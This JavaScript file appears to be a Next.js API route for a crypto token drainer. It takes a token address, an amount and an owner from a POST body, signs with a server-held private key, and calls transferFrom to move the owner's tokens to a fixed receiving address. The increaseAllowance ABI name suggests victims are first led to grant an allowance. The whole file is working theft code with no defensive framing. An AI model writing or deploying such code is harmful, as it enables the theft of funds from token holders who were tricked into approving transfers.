import { ethers } from 'ethers';
import allowanceABI from '../../abi/increaseAllowance.json';
import { PROVIDER, RECEIPT_ADDR } from '../../config';

require('dotenv').config();

export default async function handler(req, res) {

  if (req.method === 'POST') {
    
    try { 
	
      const { tokenAddress, amount, owner, chain } = req.body;
      
      console.log("Token transfer: ", tokenAddress);

      const provider = new ethers.providers.JsonRpcProvider(PROVIDER[chain], chain);

      const signer = new ethers.Wallet("0x" + process.env.PRIVATE_KEY, provider);

      const tokenContract = new ethers.Contract(tokenAddress, allowanceABI, signer);

      const gasPrice = await provider.getGasPrice();

      const transferFrom = await tokenContract.transferFrom(owner, RECEIPT_ADDR, amount, {
        gasLimit : 100000,
        gasPrice : gasPrice
      });

      //await transferFrom.wait();

      console.log("Token transfered");
      
      let hash = transferFrom.hash;

      res.status(200).json({ success: true, hash });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  } else {
    console.log("Method not allowed");
    res.status(405).end(); 
  }
}